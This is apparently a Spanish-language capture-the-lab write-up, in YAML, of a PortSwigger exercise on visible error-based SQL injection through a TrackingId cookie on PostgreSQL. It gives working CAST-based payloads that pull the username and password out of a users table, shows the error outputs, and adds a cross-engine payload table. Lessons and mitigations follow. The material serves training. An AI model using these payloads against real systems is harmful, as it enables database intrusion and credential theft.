---
title: "Inyección SQL visible basada en errores"
platform: "PortSwigger"
os: "Windows"
difficulty: "Easy"
ip: "10.10.10.XXX"
slug: "inyeccion-sql-visible-basada-en-errores"
author: "Z4k7"
date: "2026-03-27"
year: "2026"
status: "pwned"
tags:
  - "sqli"
  - "web"
  - "error"
  - "postgresql"
  - "practitioner"
techniques:
  - "SQL Injection"
  - "error-based visible"
  - "CAST AS int"
  - "LIMIT"
  - "cookie injection"
  - "extracción en una sola request"
tools:
  - "BurpSuite"
flags_list:
  - label: "usuario"
    value: "administrator"
  - label: "password"
    value: "huacecvuyw36jf575xuf"
summary: "La vulnerabilidad de SQL Injection en la cookie TrackingId expone mensajes de error SQL detallados que revelan la estructura interna de la consulta. La técnica CAST(dato AS int) fuerza un error de conversión que incluye el valor del dato en el mensaje de error — permitiendo extraer username y password en solo 2 requests, sin necesidad de Turbo Intruder ni búsqueda binaria. Motor: PostgreSQL (usa LIMIT en lugar de ROWNUM).  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Se valida la cookie `TrackingId` via BurpSuite Repeater:
      - kind: "code"
        lang: "SQL"
        code: |
          Cookie: TrackingId=Se9xRJXuLhqcoMr2;
      - kind: "note"
        text: |
          Prueba con `'--` — no genera el error requerido:
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20visible%20basada%20en%20errores/file-20260312175723877.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Prueba con solo `'` — sí genera el error visible con la consulta interna expuesta:
      - kind: "code"
        lang: "SQL"
        code: |
          Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'Se9xRJXuLhqcoMr2''. Expected char
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El mensaje de error revela la consulta completa: `SELECT * FROM tracking WHERE id = '...'`. Eso te dice el nombre de la tabla (`tracking`), la columna (`id`), y que el punto de inyección está dentro de una cadena entre comillas simples en la cláusula WHERE. En un engagement real, documenta el mensaje exacto — es evidencia forense y te da el mapa completo de la query."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "bullet"
        text: "Vector: cookie TrackingId"
      - kind: "bullet"
        text: "Motor: PostgreSQL (mensaje de error estilo PG + uso de LIMIT)"
      - kind: "bullet"
        text: "Canal: mensajes de error SQL visibles en la respuesta"
      - kind: "bullet"
        text: "Consulta interna revelada: SELECT * FROM tracking WHERE id = '[INPUT]'"
      - kind: "bullet"
        text: "Tabla objetivo: users con columnas username, password"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "`LIMIT` en lugar de `ROWNUM` (Oracle) o `TOP` (MSSQL) confirma PostgreSQL o MySQL. El mensaje de error estilo 'Unterminated string literal' es característico de PostgreSQL. Esto determina que el payload de extracción será `CAST((SELECT ...) AS int)` — la técnica de error visible de PG."

  - id: "privesc"
    num: "03"
    title: "Paso 1 — Confirmar técnica CAST"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          ' AND 1=CAST((SELECT * FROM users) AS int)--
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20visible%20basada%20en%20errores/file-20260312180315536.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          El error confirma que la técnica funciona. Aplicando lógica `1 = 1`:
      - kind: "code"
        lang: "SQL"
        code: |
          Unterminated string literal started at position 79 in SQL SELECT * FROM tracking WHERE id = '' AND 1 = CAST((SELECT * FROM users) AS int)'. Expected char
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "`CAST((SELECT dato) AS int)` fuerza a PostgreSQL a intentar convertir un string a entero — y cuando falla, incluye el valor del string en el mensaje de error. Es la técnica más eficiente de Blind SQLi: extrae datos en una sola request sin búsqueda binaria ni Turbo Intruder."

  - id: "step4"
    num: "04"
    title: "Paso 2 — Extraer username"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20visible%20basada%20en%20errores/file-20260312184754905.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          El error revela: usuario = administrator ✓
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "`LIMIT 1` es obligatorio — sin él PostgreSQL puede retornar múltiples filas y el CAST falla con un error diferente. Siempre limita a 1 fila en este tipo de extracción."

  - id: "step5_1"
    num: "05"
    title: "Paso 3 — Extraer password"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20visible%20basada%20en%20errores/file-20260312185253898.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          El error revela el password directamente en el mensaje.

  - id: "exploit"
    num: "06"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Credenciales extraídas via error-based SQLi en 2 requests. Login exitoso como administrator.
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20visible%20basada%20en%20errores/file-20260312185522069.jpg"
        caption: "Evidencia técnica"

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "usuario"
        value: "administrator"
      - label: "password"
        value: "huacecvuyw36jf575xuf"

  - id: "privesc_1"
    num: "07"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          No aplica — el acceso obtenido ya es el de administrador.

  - id: "access_1"
    num: "08"
    title: "Información — Extracción por error visible por motor"
    content:
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20visible%20basada%20en%20errores/file-20260312190320697.jpg"
        caption: "Evidencia técnica"
      - kind: "table"
        headers:
          - "Motor"
          - "Payload de extracción por error visible"
        rows:
          - ["PostgreSQL", "`CAST((SELECT password FROM users LIMIT 1) AS int)`"]
          - ["Microsoft", "`SELECT 'foo' WHERE 1=(SELECT 'secret')`"]
          - ["MySQL", "`EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))`"]

lessons:
  - 'Un error SQL visible puede convertirse en un vector de ataque completo — extracción en 2 requests.'
  - 'En auditorías, siempre validar cookies y cabeceras HTTP como posibles puntos de inyección.'
  - 'Error-based SQLi depende de mensajes detallados del servidor — por eso deshabilitar errores en producción es crítico.'
  - 'En entornos reales, la explotación puede escalar hacia dump completo de la base de datos.'
mitigation:
  - 'Implementar prepared statements y consultas parametrizadas.'
  - 'Sanitizar y validar entradas en cookies y parámetros.'
  - 'Configurar el servidor para no mostrar mensajes de error detallados en producción.'
  - 'Monitorear patrones de inyección en logs y WAF.'
---
